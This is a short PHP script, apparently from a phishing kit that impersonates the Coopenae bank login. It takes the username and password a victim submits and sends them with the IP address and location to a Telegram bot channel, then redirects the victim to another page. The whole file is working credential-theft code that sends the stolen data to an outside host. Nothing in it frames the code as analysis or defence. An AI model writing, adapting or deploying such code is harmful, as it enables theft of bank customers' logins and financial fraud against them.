<?php
ini_set("display_errors", 0);
include('dt.php');
$ip = trim(file_get_contents("http://ipinfo.io/ip"));
$cc = trim(file_get_contents("http://ipinfo.io/{$ip}/country"));
$userp = trim(file_get_contents("http://ipinfo.io/{$ip}/city"));
if ( isset ($_POST['user']) && isset ($_POST['password']) ){

$message = "Coopenae USUARIO: ".$_POST['user']."\r\nContraseña: ".$_POST['password']."\r\nIP: ".$ip." ".$userp." ".$cc."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}{  header ('location: index22.html'); exit();
}

?>